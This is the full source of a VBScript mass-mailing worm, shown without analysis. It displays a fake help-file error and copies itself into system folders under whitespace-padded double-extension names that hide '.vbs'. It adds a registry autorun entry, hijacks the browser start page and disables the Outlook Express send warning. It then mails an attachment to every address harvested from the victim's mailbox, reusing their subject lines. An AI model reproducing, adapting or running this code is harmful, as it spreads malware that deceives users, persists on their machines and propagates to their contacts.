   Sub chk()
   On Error Resume Next
   MsgBox "Unable to open HELP file. Try to press F1 or F11.", vbInformation, "Help, for stupid only!"
   Set redit = CreateObject("WScript.Shell")
   Set fso = CreateObject("scripting.filesystemobject")
   Set dirwin = fso.GetSpecialFolder(0)
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)

   Set c = fso.GetFile(WScript.ScriptFullname)
   c.Copy (dirwin & "\201004.doc                                                                                                                        .vbs")
   c.Copy (dirsystem & "\rivisto.ppt .vbs")
   c.Copy (dirtemp & "\invito.txt                                                                                                                       .vbs")
   c.Copy ("modello.xls                                                                                                                                 .vbs")
   c.Copy (dirwin & "\modifiche.vbs")

   redit.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices\", dirwin & "\modifiche.vbs"
   redit.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.pussy.org/"
   oeid = redit.regread("HKEY_CURRENT_USER\Identities\Default User ID")
   oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
   MSH = oe & "\Warn on Mapi Send"
   redit.regwrite MSH, 0, "REG_DWORD"

   send()

   End Sub

   chk()

   Sub send()
   Set dirsystem = fso.GetSpecialFolder(1)
   Set Od = CreateObject("scripting.Dictionary")
   Set MM = CreateObject("MSMAPI.MAPIMessages")
   Set MS = CreateObject("MSMAPI.MAPISession")
   MConnect MS, MM
   MM.FetchSorted = True
   MM.Fetch
   For i = 0 To MM.MsgCount - 1
   MM.MsgIndex = i
   a = MM.MsgOrigAddress
   If Od.Item(a) = "" Then
   Od.Item(a) = MM.MsgSubject
   End If
   Next
   For Each m In Od.Keys
   MM.Compose
   MM.MsgSubject = Od.Item(m)
   MM.RecipAddress = m
   MM.AttachmentIndex = MM.AttachmentCount
   MM.AttachmentPathName = "c:\Modifiche.doc"
   MM.send
   Next
   MS.SignOff
   Exit Sub
   End Sub

   Function MConnect(MS, MM)
   On Error Resume Next
   MS.DownLoadMail = False
   MS.NewSession = False
   MS.LogonUI = True
   MS.SignOn
   MM.SessionID = MS.SessionID
   End Function
